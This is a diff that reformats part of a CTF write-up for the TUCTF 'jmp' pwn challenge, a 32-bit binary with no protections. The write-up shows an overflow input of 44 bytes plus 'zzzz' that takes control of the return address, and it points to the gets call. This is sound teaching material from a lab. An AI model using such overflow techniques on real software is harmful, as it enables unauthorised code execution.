@@ -1,10 +1,12 @@
 0x1 Introduction
 =
 
-`jmp: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=afcb1c16b8d5a795af98824aaede8fabc045d4ed, not stripped`
+```
+jmp: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=afcb1c16b8d5a795af98824aaede8fabc045d4ed, not stripped
+```
 
 This file is elf 32 bit execution.
-
+```
 	CANARY    : disabled
 
 	FORTIFY   : disabled
@@ -14,12 +16,12 @@ This file is elf 32 bit execution.
 	PIE       : disabled
 	
 	RELRO     : Partial
-
+```
 And it didnt have any protect.
 
 0x2 Vulnerability
 =
-
+```
 	root@CTF:~/CTF/TUCTF/pwn/jmp# python -c "print 'a'*44+'zzzz'"|ltrace -i ./jmp 
 
 	[0x8048441] __libc_start_main(0x804851d, 1, 0xffe1b004, 0x80485f0 <unfinished ...>
@@ -43,7 +45,7 @@ And it didnt have any protect.
 	[0x7a7a7a7a] --- SIGSEGV (Segmentation fault) ---
 
 	[0xffffffffffffffff] +++ killed by SIGSEGV +++
-
+```
 It is easy to controller return address.
 
 And it have `080483d0 <gets@plt>:` function.
